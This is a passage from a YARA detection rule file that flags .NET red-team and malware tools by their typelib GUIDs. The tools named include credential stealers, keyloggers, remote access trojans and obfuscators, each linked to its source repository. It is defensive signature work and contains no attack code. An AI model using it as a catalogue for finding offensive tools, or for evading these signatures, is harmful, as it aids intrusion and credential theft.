them\n}\n\nrule HKTL_NET_GUID_ManagedInjection {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/malcomvetter/ManagedInjection\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"e5182bff-9562-40ff-b864-5a6b30c3b13b\" ascii nocase wide\n        $typelibguid1 = \"fdedde0d-e095-41c9-93fb-c2219ada55b1\" ascii nocase wide\n        $typelibguid2 = \"0dd00561-affc-4066-8c48-ce950788c3c8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpSocks {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nettitude/SharpSocks\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"2f43992e-5703-4420-ad0b-17cb7d89c956\" ascii nocase wide\n        $typelibguid1 = \"86d10a34-c374-4de4-8e12-490e5e65ddff\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Sharp_WMIExec {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/checkymander/Sharp-WMIExec\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"0a63b0a1-7d1a-4b84-81c3-bbbfe9913029\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_KeeThief {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/KeeThief\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid1 = \"39aa6f93-a1c9-497f-bad2-cc42a61d5710\" ascii nocase wide\n        $typelibguid3 = \"3fca8012-3bad-41e4-91f4-534aa9a44f96\" ascii nocase wide\n        $typelibguid4 = \"ea92f1e6-3f34-48f8-8b0a-f2bbc19220ef\" ascii nocase wide\n        $typelibguid5 = \"c23b51c4-2475-4fc6-9b3a-27d0a2b99b0f\" ascii nocase wide\n        $typelibguid6 = \"94432a8e-3e06-4776-b9b2-3684a62bb96a\" ascii nocase wide\n        $typelibguid7 = \"80ba63a4-7d41-40e9-a722-6dd58b28bf7e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_fakelogonscreen {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/bitsadmin/fakelogonscreen\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"d35a55bd-3189-498b-b72f-dc798172e505\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PoshSecFramework {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/PoshSec/PoshSecFramework\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"b1ac6aa0-2f1a-4696-bf4b-0e41cf2f4b6b\" ascii nocase wide\n        $typelibguid1 = \"78bfcfc2-ef1c-4514-bce6-934b251666d2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpAttack {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jaredhaight/SharpAttack\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"5f0ceca3-5997-406c-adf5-6c7fbb6cba17\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Altman {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/keepwn/Altman\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"64cdcd2b-7356-4079-af78-e22210e66154\" ascii nocase wide\n        $typelibguid1 = \"f1dee29d-ca98-46ea-9d13-93ae1fda96e1\" ascii nocase wide\n        $typelibguid2 = \"33568320-56e8-4abb-83f8-548e8d6adac2\" ascii nocase wide\n        $typelibguid3 = \"470ec930-70a3-4d71-b4ff-860fcb900e85\" ascii nocase wide\n        $typelibguid4 = \"9514574d-6819-44f2-affa-6158ac1143b3\" ascii nocase wide\n        $typelibguid5 = \"0f3a9c4f-0b11-4373-a0a6-3a6de814e891\" ascii nocase wide\n        $typelibguid6 = \"9624b72e-9702-4d78-995b-164254328151\" ascii nocase wide\n        $typelibguid7 = \"faae59a8-55fc-48b1-a9b5-b1759c9c1010\" ascii nocase wide\n        $typelibguid8 = \"37af4988-f6f2-4f0c-aa2b-5b24f7ed3bf3\" ascii nocase wide\n        $typelibguid9 = \"c82aa2fe-3332-441f-965e-6b653e088abf\" ascii nocase wide\n        $typelibguid10 = \"6e531f6c-2c89-447f-8464-aaa96dbcdfff\" ascii nocase wide\n        $typelibguid11 = \"231987a1-ea32-4087-8963-2322338f16f6\" ascii nocase wide\n        $typelibguid12 = \"7da0d93a-a0ae-41a5-9389-42eff85bb064\" ascii nocase wide\n        $typelibguid13 = \"a729f9cc-edc2-4785-9a7d-7b81bb12484c\" ascii nocase wide\n        $typelibguid14 = \"55a1fd43-d23e-4d72-aadb-bbd1340a6913\" ascii nocase wide\n        $typelibguid15 = \"d43f240d-e7f5-43c5-9b51-d156dc7ea221\" ascii nocase wide\n        $typelibguid16 = \"c2e6c1a0-93b1-4bbc-98e6-8e2b3145db8e\" ascii nocase wide\n        $typelibguid17 = \"714ae6f3-0d03-4023-b753-fed6a31d95c7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BrowserPass {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jabiel/BrowserPass\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"3cb59871-0dce-453b-857a-2d1e515b0b66\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Mythic {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/its-a-feature/Mythic\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"91f7a9da-f045-4239-a1e9-487ffdd65986\" ascii nocase wide\n        $typelibguid1 = \"0405205c-c2a0-4f9a-a221-48b5c70df3b6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Nuages {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/p3nt4/Nuages\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"e9e80ac7-4c13-45bd-9bde-ca89aadf1294\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpSniper {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/HunnicCyber/SharpSniper\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"c8bb840c-04ce-4b60-a734-faf15abf7b18\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpHound3 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/BloodHoundAD/SharpHound3\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"a517a8de-5834-411d-abda-2d0e1766539c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BlockEtw {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Soledge/BlockEtw\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"daedf7b3-8262-4892-adc4-425dd5f85bca\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpWifiGrabber {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/r3nhat/SharpWifiGrabber\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"c0997698-2b73-4982-b25b-d0578d1323c2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpMapExec {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cube0x0/SharpMapExec\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"bd5220f7-e1fb-41d2-91ec-e4c50c6e9b9f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_k8fly {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/zzwlpx/k8fly\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"13b6c843-f3d4-4585-b4f3-e2672a47931e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Stealer {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/malwares/Stealer\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"8fcd4931-91a2-4e18-849b-70de34ab75df\" ascii nocase wide\n        $typelibguid1 = \"e48811ca-8af8-4e73-85dd-2045b9cca73a\" ascii nocase wide\n        $typelibguid2 = \"d3d8a1cc-e123-4905-b3de-374749122fcf\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PortTran {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/k8gege/PortTran\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"3a074374-77e8-4312-8746-37f3cb00e82c\" ascii nocase wide\n        $typelibguid1 = \"67a73bac-f59d-4227-9220-e20a2ef42782\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\n\nrule HKTL_NET_GUID_gray_keylogger_2 {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/graysuit/gray-keylogger-2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"e94ca3ff-c0e5-4d1a-ad5e-f6ebbe365067\" ascii nocase wide\n        $typelibguid1 = \"1ed07564-b411-4626-88e5-e1cd8ecd860a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Lime_Miner {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Lime-Miner\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"13958fb9-dfc1-4e2c-8a8d-a5e68abdbc66\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BlackNET {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/BlackHacker511/BlackNET\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"c2b90883-abee-4cfa-af66-dfd93ec617a5\" ascii nocase wide\n        $typelibguid1 = \"8bb6f5b4-e7c7-4554-afd1-48f368774837\" ascii nocase wide\n        $typelibguid2 = \"983ae28c-91c3-4072-8cdf-698b2ff7a967\" ascii nocase wide\n        $typelibguid3 = \"9ac18cdc-3711-4719-9cfb-5b5f2d51fd5a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PlasmaRAT {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mwsrc/PlasmaRAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"b8a2147c-074c-46e1-bb99-c8431a6546ce\" ascii nocase wide\n        $typelibguid1 = \"0fcfde33-213f-4fb6-ac15-efb20393d4f3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Lime_RAT {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Lime-RAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"e58ac447-ab07-402a-9c96-95e284a76a8d\" ascii nocase wide\n        $typelibguid1 = \"8fb35dab-73cd-4163-8868-c4dbcbdf0c17\" ascii nocase wide\n        $typelibguid2 = \"37845f5b-35fe-4dce-bbec-2d07c7904fb0\" ascii nocase wide\n        $typelibguid3 = \"83c453cf-0d29-4690-b9dc-567f20e63894\" ascii nocase wide\n        $typelibguid4 = \"8b1f0a69-a930-42e3-9c13-7de0d04a4add\" ascii nocase wide\n        $typelibguid5 = \"eaaeccf6-75d2-4616-b045-36eea09c8b28\" ascii nocase wide\n        $typelibguid6 = \"5b2ec674-0aa4-4209-94df-b6c995ad59c4\" ascii nocase wide\n        $typelibguid7 = \"e2cc7158-aee6-4463-95bf-fb5295e9e37a\" ascii nocase wide\n        $typelibguid8 = \"d04ecf62-6da9-4308-804a-e789baa5cc38\" ascii nocase wide\n        $typelibguid9 = \"8026261f-ac68-4ccf-97b2-3b55b7d6684d\" ascii nocase wide\n        $typelibguid10 = \"212cdfac-51f1-4045-a5c0-6e638f89fce0\" ascii nocase wide\n        $typelibguid11 = \"c1b608bb-7aed-488d-aa3b-0c96625d26c0\" ascii nocase wide\n        $typelibguid12 = \"4c84e7ec-f197-4321-8862-d5d18783e2fe\" ascii nocase wide\n        $typelibguid13 = \"3fc17adb-67d4-4a8d-8770-ecfd815f73ee\" ascii nocase wide\n        $typelibguid14 = \"f1ab854b-6282-4bdf-8b8b-f2911a008948\" ascii nocase wide\n        $typelibguid15 = \"aef6547e-3822-4f96-9708-bcf008129b2b\" ascii nocase wide\n        $typelibguid16 = \"a336f517-bca9-465f-8ff8-2756cfd0cad9\" ascii nocase wide\n        $typelibguid17 = \"5de018bd-941d-4a5d-bed5-fbdd111aba76\" ascii nocase wide\n        $typelibguid18 = \"bbfac1f9-cd4f-4c44-af94-1130168494d0\" ascii nocase wide\n        $typelibguid19 = \"1c79cea1-ebf3-494c-90a8-51691df41b86\" ascii nocase wide\n        $typelibguid20 = \"927104e1-aa17-4167-817c-7673fe26d46e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_njRAT {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mwsrc/njRAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"5a542c1b-2d36-4c31-b039-26a88d3967da\" ascii nocase wide\n        $typelibguid1 = \"6b07082a-9256-42c3-999a-665e9de49f33\" ascii nocase wide\n        $typelibguid2 = \"c0a9a70f-63e8-42ca-965d-73a1bc903e62\" ascii nocase wide\n        $typelibguid3 = \"70bd11de-7da1-4a89-b459-8daacc930c20\" ascii nocase wide\n        $typelibguid4 = \"fc790ee5-163a-40f9-a1e2-9863c290ff8b\" ascii nocase wide\n        $typelibguid5 = \"cb3c28b2-2a4f-4114-941c-ce929fec94d3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Manager {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/TheWover/Manager\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"dda73ee9-0f41-4c09-9cad-8215abd60b33\" ascii nocase wide\n        $typelibguid1 = \"6a0f2422-d4d1-4b7e-84ad-56dc0fd2dfc5\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_neo_ConfuserEx {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/XenocodeRCE/neo-ConfuserEx\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"e98490bb-63e5-492d-b14e-304de928f81a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpAllowedToAct {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/pkb1s/SharpAllowedToAct\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"dac5448a-4ad1-490a-846a-18e4e3e0cf9a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SuperSQLInjectionV1 {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/shack2/SuperSQLInjectionV1\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"d5688068-fc89-467d-913f-037a785caca7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ADSearch {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tomcarver16/ADSearch\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"4da5f1b7-8936-4413-91f7-57d6e072b4a7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_privilege_escalation_awesome_scripts_suite {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"1928358e-a64b-493f-a741-ae8e3d029374\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CVE_2020_1206_POC {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ZecOps/CVE-2020-1206-POC\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"3523ca04-a12d-4b40-8837-1a1d28ef96de\" ascii nocase wide\n        $typelibguid1 = \"d3a2f24a-ddc6-4548-9b3d-470e70dbcaab\" ascii nocase wide\n        $typelibguid2 = \"fb30ee05-4a35-45f7-9a0a-829aec7e47d9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DInvoke {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/TheWover/DInvoke\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"b77fdab5-207c-4cdb-b1aa-348505c54229\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpChisel {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/shantanu561993/SharpChisel\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"f5f21e2d-eb7e-4146-a7e1-371fd08d6762\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpScribbles {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/V1V1/SharpScribbles\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"aa61a166-31ef-429d-a971-ca654cd18c3b\" ascii nocase wide\n        $typelibguid1 = \"0dc1b824-c6e7-4881-8788-35aecb34d227\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpReg {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/SharpReg\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"8ef25b00-ed6a-4464-bdec-17281a4aa52f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_MemeVM {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/TobitoFatitoRE/MemeVM\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"ef18f7f2-1f03-481c-98f9-4a18a2f12c11\" ascii nocase wide\n        $typelibguid1 = \"77b2c83b-ca34-4738-9384-c52f0121647c\" ascii nocase wide\n        $typelibguid2 = \"14d5d12e-9a32-4516-904e-df3393626317\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpDir {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/SharpDir\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"c7a07532-12a3-4f6a-a342-161bb060b789\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AtYourService {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mitchmoser/AtYourService\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"bc72386f-8b4c-44de-99b7-b06a8de3ce3f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_LockLess {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/LockLess\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"a91421cb-7909-4383-ba43-c2992bbbac22\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_EasyNet {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/TheWover/EasyNet\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"3097d856-25c2-42c9-8d59-2cdad8e8ea12\" ascii nocase wide\n        $typelibguid1 = \"ba33f716-91e0-4cf7-b9bd-b4d558f9a173\" ascii nocase wide\n        $typelibguid2 = \"37d6dd3f-5457-4d8b-a2e1-c7b156b176e5\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpByeBear {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/S3cur3Th1sSh1t/SharpByeBear\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"a6b84e35-2112-4df2-a31b-50fde4458c5e\" ascii nocase wide\n        $typelibguid1 = \"3e82f538-6336-4fff-aeec-e774676205da\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpHide {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/outflanknl/SharpHide\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"443d8cbf-899c-4c22-b4f6-b7ac202d4e37\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpSvc {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/SharpSvc\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"52856b03-5acd-45e0-828e-13ccb16942d1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpCrashEventLog {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/slyd0g/SharpCrashEventLog\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"98cb495f-4d47-4722-b08f-cefab2282b18\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DotNetToJScript_LanguageModeBreakout {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FuzzySecurity/DotNetToJScript-LanguageModeBreakout\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"deadb33f-fa94-41b5-813d-e72d8677a0cf\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharPermission {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mitchmoser/SharPermission\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"84d2b661-3267-49c8-9f51-8f72f21aea47\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_RegistryStrikesBack {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mdsecactivebreach/RegistryStrikesBack\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"90ebd469-d780-4431-9bd8-014b00057665\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CloneVault {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mdsecactivebreach/CloneVault\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"0a344f52-6780-4d10-9a4a-cb9439f9d3de\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_donut {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/TheWover/donut\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"98ca74c7-a074-434d-9772-75896e73ceaa\" ascii nocase wide\n        $typelibguid1 = 